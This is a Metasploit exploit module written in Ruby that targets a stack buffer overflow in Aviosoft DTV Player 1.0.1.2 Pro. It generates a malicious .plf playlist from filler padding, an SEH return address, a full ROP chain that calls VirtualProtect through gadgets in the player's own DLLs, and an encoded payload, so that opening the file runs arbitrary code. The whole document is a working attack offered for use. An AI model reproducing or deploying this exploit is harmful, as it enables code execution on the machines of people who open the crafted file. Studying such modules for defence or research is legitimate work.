require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Aviosoft DTV Player 1.0.1.2 .plf PlayList Buffer Overflow",
			'Description'    => %q{
					This module exploits a stack-based buffer overflow on Aviosoft DTV Player 1.0.1.2 Pro.
				By supplying a long string of data in a plf file (playlist), the MediaPlayerCtrl.dll component 
                                will attempt to extract a filename out of the string, and then copy it on the stack without 
          			any proper bounds checking, which casues a buffer overflow, and results arbitrary code 
				execution under the context of the user.

					This module has been designed to target common Windows systems such as:
				Windows XP SP2/SP3, Windows Vista SP1/SP2, and Windows 7 SP1.
			},
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 13673 $",
			'Author'         =>
				[
					'modpr0be',
				],
			'References'     =>
				[
					[ 'CERT', '998403' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/18096' ],
				],
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x0a\x1a\x2f\x3a\x5c\x80",
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "seh",  #none/process/seh
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Aviosoft DTV Player 1.0.1.2 Professional',
						{
							'Offset' => 872,        #To SEH
							'Ret'    => 0x6130534a, #ADD ESP,800 # RETN	[DTVDeviceManager.dll]
							'Max'    => 6000,       #Max buffer size
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Jun 02 2007",
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [false, 'The file name', 'msf.plf'])
				], self.class)
	end

	def exploit
		rop = [
			0x61326003,	# RETN (ROP NOP) [DTVDeviceManager.dll]
			0x61326003,	# RETN (ROP NOP) [DTVDeviceManager.dll]
			0x61326003,	# RETN (ROP NOP) [DTVDeviceManager.dll]
			0x61326003,	# RETN (ROP NOP) [DTVDeviceManager.dll]
			0x61326003,	# RETN (ROP NOP) [DTVDeviceManager.dll]
			0x61326003,	# RETN (ROP NOP) [DTVDeviceManager.dll]
			0x61326003,	# RETN (ROP NOP) [DTVDeviceManager.dll]
			0x61326003,	# RETN (ROP NOP) [DTVDeviceManager.dll]
			0x61326003,	# RETN (ROP NOP) [DTVDeviceManager.dll]
			0x61326003,	# RETN (ROP NOP) [DTVDeviceManager.dll]
			0x6405347a,	# POP EDX # RETN 	** [MediaPlayerCtrl.dll]
			0x10011108,	# ptr to &VirtualProtect() [IAT SkinScrollBar.Dll]
			0x64010503,	# PUSH EDX # POP EAX # POP ESI # RETN    ** [MediaPlayerCtrl.dll]
			0x41414141,	# Filler (compensate)
			0x6160949f,	# MOV ECX,DWORD PTR DS:[EDX] # POP ESI # POP EBP # MOV DWORD PTR DS:[EAX],ECX # POP EBX # RETN 0C    ** [EPG.dll]
			0x41414141,	# Filler (compensate)
			0x41414141,	# Filler (compensate)
			0x41414141,	# Filler (compensate)
			0x61604218,	# PUSH ECX # ADD AL,5F # XOR EAX,EAX # POP ESI # RETN 0C    ** [EPG.dll]
			0x41414141,	# Filler (RETN offset compensation)
			0x41414141,	# Filler (RETN offset compensation)
			0x41414141,	# Filler (RETN offset compensation)
			0x6403d1a6,	# POP EBP # RETN [MediaPlayerCtrl.dll] 
			0x41414141,	# Filler (RETN offset compensation)
			0x41414141,	# Filler (RETN offset compensation)
			0x41414141,	# Filler (RETN offset compensation)
			0x60333560,	# & push esp #  ret 0c [Configuration.dll]
			0x61323EA8,	# POP EAX # RETN    ** [DTVDeviceManager.dll]
			0xA139799D,	# 0x00000343-> ebx
			0x640203fc,	# ADD EAX,5EC68B64 # RETN    ** [MediaPlayerCtrl.dll]
			0x6163d37b,	# PUSH EAX # ADD AL,5E # POP EBX # RETN    ** [EPG.dll]
			0x61626807,	# XOR EAX,EAX # RETN    ** [EPG.dll]
			0x640203fc,	# ADD EAX,5EC68B64 # RETN    ** [MediaPlayerCtrl.dll]
			0x6405347a,	# POP EDX # RETN    ** [MediaPlayerCtrl.dll]
			0xA13974DC,	# 0x00000040-> edx
			0x613107fb,	# ADD EDX,EAX # MOV EAX,EDX # RETN    ** [DTVDeviceManager.dll]
			0x60326803,	# POP ECX # RETN [Configuration.dll] 
			0x60350340,	# &Writable location [AviosoftDTV.exe]
			0x61329e07,	# POP EDI # RETN [DTVDeviceManager.dll] 
			0x61326003,	# RETN (ROP NOP) [DTVDeviceManager.dll]
			0x60340178,	# POP EAX # RETN ** [Configuration.dll] 
			0x90909090,	# nop
			0x60322e02,	# PUSHAD # RETN [Configuration.dll] 
		].pack('V*')
		
		buf = ''
		buf << rand_text_alpha(target['Offset'])
		buf << [target.ret].pack('V')
		buf << rand_text_alpha(136)
		buf << rop
		buf << make_nops(15)
		buf << payload.encoded
		buf << rand_text_alpha(target['Max'] - buf.length)
		print_status("Creating #{datastore['FILENAME']}...")
		file_create(buf)
	end
end
